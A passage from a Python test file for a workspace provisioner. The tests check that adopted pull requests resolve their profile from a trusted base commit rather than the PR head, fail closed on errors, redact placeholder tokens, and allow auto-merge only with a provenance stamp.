        path = kwargs.get("worktree_path")
        if isinstance(path, Path):
            resolve_paths.append(path)
        return real_resolve(**kwargs)

    monkeypatch.setattr("awf.node.provisioner.resolve_workspace_profile", _spy_resolve)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)

    head_worktree = git_manager.get_worktree_path(workspace_id)
    snap_id = _trusted_base_profile_worktree_id(workspace_id)
    snap_path = git_manager.get_worktree_path(snap_id)

    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"
        assert str(reloaded.resolved_profile.get("source", "")).startswith("repo:")
        assert reloaded.remote_push_branch == "feature/stale"
        assert reloaded.base_commit == base_sha
        phases = reloaded.resolved_profile.get("phases") or {}
        setup = phases.get("setup") or []
        assert setup and "trusted-base-setup" in str(setup)
        stamped = ((reloaded.task_policy or {}).get("pr_adoption") or {}).get(
            _PROFILE_TRUSTED_BASE_SHA_KEY
        )
        assert stamped == base_sha.lower()
        assert reloaded.auto_merge is True

    assert _git_stdout(["rev-parse", "HEAD"], head_worktree) == head_sha
    head_profile = (head_worktree / ".awf" / "workspace.yml").read_text(encoding="utf-8")
    assert "head-unsafe" in head_profile
    assert not snap_path.exists()
    assert resolve_paths
    assert all(path != head_worktree for path in resolve_paths)
    assert any(snap_id in str(path) for path in resolve_paths)


@pytest.mark.asyncio
async def test_adopted_inline_profile_skips_trusted_base_snapshot(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    calls: list[str] = []

    async def _boom(*_a: Any, **_k: Any) -> WorktreeLayout:
        calls.append("detached")
        raise AssertionError("inline profile must not materialize trusted base snapshot")

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                requested_profile={"name": "operator-inline", "docker": {"mode": "none"}},
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    assert calls == []
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "operator-inline"


@pytest.mark.asyncio
async def test_adopted_explicit_registry_profile_skips_trusted_base_snapshot(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    calls: list[str] = []

    async def _boom(*_a: Any, **_k: Any) -> WorktreeLayout:
        calls.append("detached")
        raise AssertionError("registry profile_ref must not use trusted base snapshot")

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha, profile_ref="generic")
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    assert calls == []
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        # Repo marker still beats registry under ordinary resolve; this test
        # only proves the trusted-base snapshot path was not used.
        assert reloaded.resolved_profile["name"] == "head-unsafe"
        assert str(reloaded.resolved_profile.get("source", "")).startswith("repo:")


@pytest.mark.asyncio
async def test_ordinary_feature_branch_still_resolves_from_checkout(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    origin_repo, _base_sha, _ = origin_stale_head
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            repo_url=str(origin_repo),
            branch_base="development",
            task_title="feature",
            task_prompt="p",
            agent="codex",
            test_commands=[],
            task_kind="feature_branch_pr",
            profile_ref="auto",
        )
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"


@pytest.mark.asyncio
async def test_frozen_resolved_profile_skips_trusted_base_snapshot(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    calls: list[str] = []

    async def _boom(*_a: Any, **_k: Any) -> WorktreeLayout:
        calls.append("detached")
        raise AssertionError("frozen resolved_profile must not re-resolve from base")

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                resolved_profile={
                    "name": "already-frozen",
                    "source": "repo:.awf/workspace.yml",
                },
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    assert calls == []
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "already-frozen"


@pytest.mark.asyncio
async def test_fork_head_identity_preserved_after_trusted_base_resolve(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    origin_repo, base_sha, head_sha = origin_stale_head
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                head_ref="fork-owner:feature/stale",
                extra_adoption={
                    "head_repo_full_name": "fork-owner/app",
                    "head_repo_clone_url": "https://github.com/fork-owner/app.git",
                },
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.remote_push_branch == "fork-owner:feature/stale"
        stored = (reloaded.task_policy or {}).get("pr_adoption") or {}
        assert stored.get("head_ref") == "fork-owner:feature/stale"
        assert stored.get("head_repo_full_name") == "fork-owner/app"
        assert stored.get("head_repo_clone_url") == ("https://github.com/fork-owner/app.git")
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"
    assert (
        _git_stdout(["rev-parse", "HEAD"], git_manager.get_worktree_path(workspace_id)) == head_sha
    )


@pytest.mark.asyncio
async def test_missing_trusted_base_sha_fails_closed_without_head_fallback(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, _base_sha, _ = origin_stale_head
    resolve_paths: list[Path] = []
    real_resolve = resolve_workspace_profile

    def _spy_resolve(**kwargs: Any) -> Any:
        path = kwargs.get("worktree_path")
        if isinstance(path, Path):
            resolve_paths.append(path)
        return real_resolve(**kwargs)

    monkeypatch.setattr("awf.node.provisioner.resolve_workspace_profile", _spy_resolve)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=None)
        )
        ws.pr_number = 42
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(ProfileResolutionError):
        await provisioner.provision(workspace_id)

    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.failure_reason == "profile_resolution_failure"
    head_worktree = git_manager.get_worktree_path(workspace_id)
    assert all(path != head_worktree for path in resolve_paths)


@pytest.mark.asyncio
async def test_trusted_base_resolve_failure_reclaims_snapshot(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    snap_ids_seen: list[str] = []
    real_add = git_manager.add_detached_worktree_at_commit

    async def _tracking_add(*, workspace_id: str, repo_url: str, commit_sha: str) -> WorktreeLayout:
        snap_ids_seen.append(workspace_id)
        return await real_add(workspace_id=workspace_id, repo_url=repo_url, commit_sha=commit_sha)

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _tracking_add)

    def _boom(**_kwargs: Any) -> Any:
        raise ProfileResolutionError(
            "synthetic base resolve failure",
            reason_code="PROFILE_TRUSTED_BASE_RESOLVE_FAILED",
        )

    monkeypatch.setattr("awf.node.provisioner.resolve_workspace_profile", _boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(ProfileResolutionError):
        await provisioner.provision(workspace_id)

    assert snap_ids_seen == [_trusted_base_profile_worktree_id(workspace_id)]
    assert not git_manager.get_worktree_path(snap_ids_seen[0]).exists()
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.failure_reason == "profile_resolution_failure"


@pytest.mark.asyncio
async def test_trusted_base_snapshot_cleanup_failure_fails_closed_and_redacts(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    secret = "ghp_cleanupSecretTokenValue888"
    real_add = git_manager.add_detached_worktree_at_commit

    async def _tracking_add(*, workspace_id: str, repo_url: str, commit_sha: str) -> WorktreeLayout:
        return await real_add(workspace_id=workspace_id, repo_url=repo_url, commit_sha=commit_sha)

    async def _cleanup_boom(*, workspace_id: str, repo_url: str) -> None:
        del workspace_id, repo_url
        raise GitOperationError(
            operation="worktree.remove",
            returncode=1,
            stdout="",
            stderr=f"fatal: could not remove worktree using token {secret}",
            reason_code="GIT_WORKTREE_REMOVE_FAILED",
        )

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _tracking_add)
    monkeypatch.setattr(git_manager, "remove_worktree", _cleanup_boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(GitOperationError) as raised:
        await provisioner.provision(workspace_id)

    assert raised.value.reason_code == "GIT_WORKTREE_REMOVE_FAILED"
    assert secret not in raised.value.stderr
    assert secret not in str(raised.value)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.failure_reason == "infrastructure_failure"
        message = reloaded.failure_message or ""
        assert secret not in message
        assert REDACTION_MARKER in message or "ghp_" not in message
        assert any(event.reason_code == "GIT_WORKTREE_REMOVE_FAILED" for event in reloaded.events)


@pytest.mark.asyncio
async def test_trusted_base_resolve_failure_not_masked_by_cleanup_failure(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Cleanup failure must not swallow an in-flight resolve reason_code."""
    origin_repo, base_sha, _ = origin_stale_head

    def _boom(**_kwargs: Any) -> Any:
        raise ProfileResolutionError(
            "synthetic base resolve failure",
            reason_code="PROFILE_TRUSTED_BASE_RESOLVE_FAILED",
        )

    async def _cleanup_boom(*, workspace_id: str, repo_url: str) -> None:
        del workspace_id, repo_url
        raise GitOperationError(
            operation="worktree.remove",
            returncode=1,
            stdout="",
            stderr="fatal: could not remove worktree",
            reason_code="GIT_WORKTREE_REMOVE_FAILED",
        )

    monkeypatch.setattr("awf.node.provisioner.resolve_workspace_profile", _boom)
    monkeypatch.setattr(git_manager, "remove_worktree", _cleanup_boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(ProfileResolutionError) as raised:
        await provisioner.provision(workspace_id)

    assert raised.value.reason_code == "PROFILE_TRUSTED_BASE_RESOLVE_FAILED"
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.failure_reason == "profile_resolution_failure"


@pytest.mark.asyncio
async def test_legacy_frozen_repo_profile_requires_explicit_auto_merge_intent(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Frozen PR-head repo profiles must not self-authorize auto-merge."""
    origin_repo, base_sha, _ = origin_stale_head
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                resolved_profile={
                    "name": "legacy-head",
                    "source": "repo:.awf/workspace.yml",
                    "monitor": {"auto_merge": {"default": True}},
                    "docker": {"mode": "none"},
                },
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "legacy-head"
        # No trusted-base provenance stamp on legacy freeze → DEFAULT_AUTO_MERGE.
        assert reloaded.auto_merge is False
        adoption = (reloaded.task_policy or {}).get("pr_adoption") or {}
        assert _PROFILE_TRUSTED_BASE_SHA_KEY not in adoption


@pytest.mark.asyncio
async def test_trusted_base_materialize_failure_message_is_redacted(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    origin_repo, base_sha, _ = origin_stale_head
    secret = "ghp_supersecretTokenValue999"

    async def _boom(*, workspace_id: str, repo_url: str, commit_sha: str) -> WorktreeLayout:
        del workspace_id, repo_url, commit_sha
        raise GitOperationError(
            operation="worktree.add_detached",
            returncode=1,
            stdout="",
            stderr=f"fatal: could not read '{secret}' from remote",
            reason_code="GIT_BASE_BRANCH_MISSING",
        )

    monkeypatch.setattr(git_manager, "add_detached_worktree_at_commit", _boom)

    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(GitOperationError):
        await provisioner.provision(workspace_id)

    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        message = reloaded.failure_message or ""
        assert secret not in message
        assert REDACTION_MARKER in message or "ghp_" not in message


@pytest.mark.asyncio
async def test_host_port_failure_after_trusted_base_resolve_stamps_provenance(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Host-port fail after trusted resolve must not leave an unstamped freeze."""
    origin_repo, base_sha, _ = origin_stale_head
    companion_policy = {
        "companions": [
            {
                "name": "sidecar",
                "repo_url": str(origin_repo),
                "base_branch": "development",
                "ports": [[5432, 15434]],
            }
        ]
    }

    class _RecordingStackLauncher:
        def __init__(self) -> None:
            self.requests: list[Any] = []

        async def launch(self, request: Any) -> object:
            self.requests.append(request)
            raise AssertionError("stack launch must not run after host-port conflict")

    launcher = _RecordingStackLauncher()
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        stack_launcher=launcher,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        repo = WorkspaceRepository(s)
        source = await repo.create(
            repo_url=str(origin_repo),
            branch_base="development",
            task_title="source-ports",
            task_prompt="p",
            agent="codex",
            task_policy=companion_policy,
            test_commands=[],
        )
        source.node_id = "test-node-01"
        source.compose_project_name = f"awf_{source.id}"
        await repo.transition(source, to=WorkspaceStatus.provisioning, reason_code="SEED")
        await repo.transition(source, to=WorkspaceStatus.failed, reason_code="SEED")

        kwargs = _adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        policy = dict(kwargs["task_policy"])
        policy["companions"] = companion_policy["companions"]
        kwargs["task_policy"] = policy
        ws = await repo.create(**kwargs)
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    assert launcher.requests == []

    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.failure_reason == "infrastructure_failure"
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"
        assert str(reloaded.resolved_profile.get("source", "")).startswith("repo:")
        _assert_trusted_base_stamp(reloaded, base_sha=base_sha)
        # Unset intent + stamped trusted repo profile must remain trustable.
        assert str(reloaded.resolved_profile.get("source", "")).startswith("repo:")
        assert _provision_profile_auto_merge_is_trusted(
            reloaded,
            WorkspaceProfile(
                name="base-safe",
                source="repo:.awf/workspace.yml",
                monitor={"auto_merge": {"default": True}},
            ),
        )


@pytest.mark.asyncio
async def test_stack_startup_failure_after_trusted_base_resolve_stamps_provenance(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Pre-launch freeze + stack fail must persist matching trusted-base stamp."""
    origin_repo, base_sha, _ = origin_stale_head

    class _FailingStackLauncher:
        def __init__(self) -> None:
            self.requests: list[Any] = []

        async def launch(self, request: Any) -> object:
            self.requests.append(request)
            raise ComposeOperationError(
                operation="compose.up",
                returncode=1,
                stdout="",
                stderr="service db failed to start",
                reason_code="COMPOSE_UP_FAILED",
            )

    launcher = _FailingStackLauncher()
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        stack_launcher=launcher,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(origin_repo, base_sha=base_sha)
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    with pytest.raises(ComposeOperationError):
        await provisioner.provision(workspace_id)

    assert launcher.requests
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"
        _assert_trusted_base_stamp(reloaded, base_sha=base_sha)
        assert str(reloaded.resolved_profile.get("source", "")).startswith("repo:")
        assert _provision_profile_auto_merge_is_trusted(
            reloaded,
            WorkspaceProfile(
                name="base-safe",
                source="repo:.awf/workspace.yml",
                monitor={"auto_merge": {"default": True}},
            ),
        )


@pytest.mark.asyncio
async def test_retry_of_unstamped_frozen_trusted_profile_forces_auto_merge_false(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Negative: frozen trusted-looking snapshot without stamp must not auto-merge."""
    origin_repo, base_sha, _ = origin_stale_head
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                resolved_profile={
                    "name": "base-safe",
                    "source": "repo:.awf/workspace.yml",
                    "monitor": {"auto_merge": {"default": True}},
                    "docker": {"mode": "none"},
                },
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.auto_merge is False
        adoption = (reloaded.task_policy or {}).get("pr_adoption") or {}
        assert _PROFILE_TRUSTED_BASE_SHA_KEY not in adoption


@pytest.mark.asyncio
async def test_retry_of_stamped_frozen_profile_from_failure_honors_auto_merge(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Stamped freeze from a prior failure path must keep profile auto-merge on retry."""
    origin_repo, base_sha, _ = origin_stale_head
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    stamped_policy = _stamp_trusted_base_profile_provenance(
        {
            "pr_adoption": {
                "pr_number": 42,
                "head_ref": "feature/stale",
                "base_ref": "development",
                "base_sha": base_sha,
            },
            AUTO_MERGE_INTENT_POLICY_KEY: None,
        },
        trusted_base_sha=base_sha,
    )
    async with session_factory() as s:
        ws = await WorkspaceRepository(s).create(
            **_adopted_workspace_kwargs(
                origin_repo,
                base_sha=base_sha,
                resolved_profile={
                    "name": "base-safe",
                    "source": "repo:.awf/workspace.yml",
                    "monitor": {"auto_merge": {"default": True}},
                    "docker": {"mode": "none"},
                },
            )
        )
        ws.pr_number = 42
        ws.base_commit = base_sha
        ws.task_policy = stamped_policy
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.ready.value
        assert reloaded.resolved_profile is not None
        assert reloaded.resolved_profile["name"] == "base-safe"
        _assert_trusted_base_stamp(reloaded, base_sha=base_sha)
        assert reloaded.auto_merge is True


@pytest.mark.asyncio
async def test_rehydration_failure_replaces_legacy_freeze_before_stamp(
    session_factory: async_sessionmaker[AsyncSession],
    git_manager: GitManager,
    origin_stale_head: tuple[Path, str, str],
) -> None:
    """Rehydrate+fail must not stamp an untouched PR-head freeze in place."""
    origin_repo, base_sha, _ = origin_stale_head
    companion_policy = {
        "companions": [
            {
                "name": "sidecar",
                "repo_url": str(origin_repo),
                "base_branch": "development",
                "ports": [[5432, 15435]],
            }
        ]
    }

    class _RecordingStackLauncher:
        def __init__(self) -> None:
            self.requests: list[Any] = []

        async def launch(self, request: Any) -> object:
            self.requests.append(request)
            raise AssertionError("stack launch must not run after host-port conflict")

    launcher = _RecordingStackLauncher()
    provisioner = Provisioner(
        session_factory=session_factory,
        git=git_manager,
        stack_launcher=launcher,
        config=ProvisionerConfig(node_id="test-node-01"),
    )
    async with session_factory() as s:
        repo = WorkspaceRepository(s)
        source = await repo.create(
            repo_url=str(origin_repo),
            branch_base="development",
            task_title="source-ports-rehydrate",
            task_prompt="p",
            agent="codex",
            task_policy=companion_policy,
            test_commands=[],
        )
        source.node_id = "test-node-01"
        source.compose_project_name = f"awf_{source.id}"
        await repo.transition(source, to=WorkspaceStatus.provisioning, reason_code="SEED")
        await repo.transition(source, to=WorkspaceStatus.failed, reason_code="SEED")

        kwargs = _adopted_workspace_kwargs(
            origin_repo,
            base_sha=base_sha,
            resolved_profile={
                "name": "legacy-head",
                "source": "repo:.awf/workspace.yml",
                "monitor": {"auto_merge": {"default": True}},
                "docker": {"mode": "none"},
                # Force credential rehydration so trusted-base resolve runs
                # while a PR-head freeze is already on the row.
                "secrets": {"CURSOR_API_KEY": REDACTION_MARKER},
            },
        )
        policy = dict(kwargs["task_policy"])
        policy["companions"] = companion_policy["companions"]
        kwargs["task_policy"] = policy
        ws = await repo.create(**kwargs)
        ws.pr_number = 42
        ws.base_commit = base_sha
        await s.commit()
        workspace_id = ws.id

    await provisioner.provision(workspace_id)
    assert launcher.requests == []

    async with session_factory() as s:
        reloaded = await WorkspaceRepository(s).get(workspace_id)
        assert reloaded is not None
        assert reloaded.status == WorkspaceStatus.failed.value
        assert reloaded.resolved_profile is not None
        # Must replace the legacy PR-head freeze with the trusted-base snapshot
        # before stamping — never mint provenance onto legacy-head.
        assert reloaded.resolved_profile["name"] == "base-safe"
        assert reloaded.resolved_profile["name"] != "legacy-head"
        _assert_trusted_base_stamp(reloaded, base_sha=base_sha)
        assert _provision_profile_auto_merge_is_trusted(
            reloaded,
            WorkspaceProfile(
                name="base-safe",
                source="repo:.awf/workspace.yml",
                monitor={"auto_merge": {"default": True}},
            ),
        )
